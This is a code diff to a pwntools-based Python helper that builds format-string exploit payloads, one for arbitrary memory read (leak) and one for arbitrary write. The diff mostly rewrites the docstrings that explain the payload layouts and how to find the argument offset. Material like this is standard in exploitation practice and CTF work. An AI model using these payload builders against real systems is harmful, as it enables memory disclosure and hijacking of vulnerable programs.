@@ -1,20 +1,18 @@
 #!/usr/bin/env python3
-"""format_string.py — pwntools-backed format string primitive builders for
-arbitrary read (leak) and arbitrary write.
+"""format_string.py — format-string primitive builders for arbitrary read
+(leak) and arbitrary write. Wraps pwnlib's ``fmtstr_payload`` for writes.
 
 Usage
 -----
     python format_string.py leak  --offset N --target ADDR [--arch {64|32}]
     python format_string.py write --offset N --target ADDR --value VAL [--arch {64|32}]
 
-``--offset`` is the format-string argument index where your input lands
-(find this by sending ``%1$p %2$p %3$p ...`` and observing your `AAAA` echoes
-back). ``--target`` is the absolute address to read from / write to.
+Find ``--offset`` by sending ``%1$p %2$p %3$p ...`` and counting where your
+``AAAA`` echoes back. ``--target`` is the absolute address to read/write.
 
-For ``leak`` the script emits ``%<offset>$s`` prefixed by the target address
-(64-bit) or suffixed (32-bit, where format-strings have no NUL issues with
-small offsets). For ``write`` the script delegates to pwnlib's
-``fmtstr_payload``, which handles byte-by-byte ``%hhn`` chains correctly.
+The leak layout is directive + NUL pad + address: the directive runs first,
+then printf hits NUL, and the address sits at varargs slot ``offset`` to be
+deref'd by ``%N$s``. The write layout is whatever pwnlib emits.
 """
 from __future__ import annotations
 
@@ -26,11 +24,8 @@ from pwnlib.fmtstr import fmtstr_payload
 
 
 def make_leak(offset: int, target_addr: int, arch: int = 64) -> bytes:
-    """Build a leak payload: send target_addr's bytes plus a ``%N$s`` deref.
-
-    The address must not contain a NUL byte that terminates the format
-    string before the ``%N$s`` directive runs; we place the address AFTER
-    the directive (padded to land at slot ``offset``)."""
+    """Directive first, NUL-padded to a word boundary, then the target
+    address — so the address lands at varargs slot ``offset``."""
     if arch == 64:
         addr_bytes = p64(target_addr)
         word = 8
@@ -46,10 +41,7 @@ def make_leak(offset: int, target_addr: int, arch: int = 64) -> bytes:
 
 
 def make_write(offset: int, target_addr: int, value: int, arch: int = 64) -> bytes:
-    """Build an arbitrary-write payload using pwnlib's ``fmtstr_payload``.
-
-    Uses byte-granular ``%hhn`` writes — the most reliable size since 64-bit
-    addresses tend to differ by more than 65k between target and pivot."""
+    """``fmtstr_payload`` with byte-granular ``%hhn`` writes."""
     if arch == 64:
         context.bits = 64
     elif arch == 32:
